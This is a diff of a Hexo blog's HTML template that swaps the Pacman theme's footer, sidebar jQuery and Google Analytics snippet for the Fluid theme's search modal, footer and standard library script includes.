+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-    <footer><div id="footer" >
-	
-	<div class="line">
-		<span></span>
-		<div class="author"></div>
-	</div>
-	
-	
-	<div class="social-font clearfix">
-		
-		
-		
-		
-		
-	</div>
-		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2019 
-		
-		<a href="http://L0yy.github.io" target="_blank" title="Cray">Cray</a>
-		
-		</p>
+  </div>
 </div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+    
+  </div>
 </footer>
-    <script src="/js/jquery-2.1.0.min.js"></script>
-<script type="text/javascript">
-$(document).ready(function(){ 
-  $('.navbar').click(function(){
-    $('header nav').toggleClass('shownav');
-  });
-  var myWidth = 0;
-  function getSize(){
-    if( typeof( window.innerWidth ) == 'number' ) {
-      myWidth = window.innerWidth;
-    } else if( document.documentElement && document.documentElement.clientWidth) {
-      myWidth = document.documentElement.clientWidth;
+
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js" ></script>
+<script src="/lib/popper/popper.min.js" ></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
+<script src="/js/main.js" ></script>
+
+
+  <script src="/js/lazyload.js" ></script>
+
+
+
+  <script src="/lib/prettify/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="/lib/typed/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="/lib/anchor/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
     };
-  };
-  var m = $('#main'),
-      a = $('#asidepart'),
-      c = $('.closeaside'),
-      o = $('.openaside');
-  $(window).resize(function(){
-    getSize(); 
-    if (myWidth >= 1024) {
-      $('header nav').removeClass('shownav');
-    }else
-    {
-      m.removeClass('moveMain');
-      a.css('display', 'block').removeClass('fadeOut');
-      o.css('display', 'none');
-        
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
     }
-  });
-  c.click(function(){
-    a.addClass('fadeOut').css('display', 'none');
-    o.css('display', 'block').addClass('fadeIn');
-    m.addClass('moveMain');
-  });
-  o.click(function(){
-    o.css('display', 'none').removeClass('beforeFadeIn');
-    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
-    m.removeClass('moveMain');
-  });
-  $(window).scroll(function(){
-    o.css("top",Math.max(80,260-$(this).scrollTop()));
-  });
-});
-</script>
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
+  <script>
+    $('#post').find('img').each(
+      function () {
+        var _this = $(this);
+        var _src = _this.attr("src");
+        _this.wrap('<a data-fancybox="images" href="' + _src + '" ></a>');
+      }
+    );
+  </script>
+
+
+
+  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
 
 
 
 
-
-
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-ga('create', 'UA-146435492-1', 'l0yy.github.io');  
-ga('send', 'pageview');
-</script>
-
-
-  </body>
- </html>
+</body>
+</html>
